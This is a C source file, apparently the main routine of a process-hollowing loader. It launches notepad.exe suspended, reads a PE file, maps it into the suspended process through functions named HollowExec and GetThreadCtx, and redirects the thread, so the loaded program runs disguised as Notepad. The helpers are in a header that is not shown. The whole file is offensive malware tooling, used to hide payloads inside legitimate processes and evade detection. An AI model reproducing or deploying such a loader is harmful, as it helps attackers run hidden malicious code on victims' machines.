#include "Box.h"

#define TARGET_PROCESS	"notepad.exe"

int main()
{

	HANDLE					hProcess			= NULL, 
							hThread				= NULL;
	DWORD					PID					= 0, 
							NumOfBytesToRead	= 0, 
							Delta				= NULL;
	PIMAGE_NT_HEADERS		pImgNt				= NULL;
	PIMAGE_SECTION_HEADER	pImgSecHeader		= NULL;
	PIMAGE_DATA_DIRECTORY	pImgDataDir			= NULL;

	LPVOID	lpBuffer		= NULL, 
			rBuffer			= NULL, 
			peBaseAddress	= NULL, 
			lpFile			= NULL;


	if (!CreateSuspendedProcess(TARGET_PROCESS, &hProcess, &hThread))
	{
		PRINT_ERROR("CreateSuspendedProcess");
		return 1;
	}

	if (!ReadTargetFile(&lpBuffer, &NumOfBytesToRead))
	{
		PRINT_ERROR("ReadTargetFile");
		return 1;
	}

	if (!GrabPeHeader(&pImgNt, &pImgSecHeader, &pImgDataDir, lpBuffer))
	{
		PRINT_ERROR("GrabPeHeader");
		return 1;
	}

	if (!HollowExec(hProcess, pImgNt, &rBuffer, pImgSecHeader, pImgDataDir, lpBuffer))
	{
		PRINT_ERROR("HollowExec");
		return 1;
	}

	if (!GetThreadCtx(hProcess, hThread, pImgNt, rBuffer))
	{
		PRINT_ERROR("GetThreadCtx");
		return 1;
	}

	CHAR("Cleanup...");
	getchar();

	if (hProcess)
		CloseHandle(hProcess);

	if (hThread)
		CloseHandle(hThread);

	if (rBuffer)
		VirtualFree(rBuffer, 0, MEM_RELEASE);

	CHAR("Quit...");
	getchar();

	return 0;

}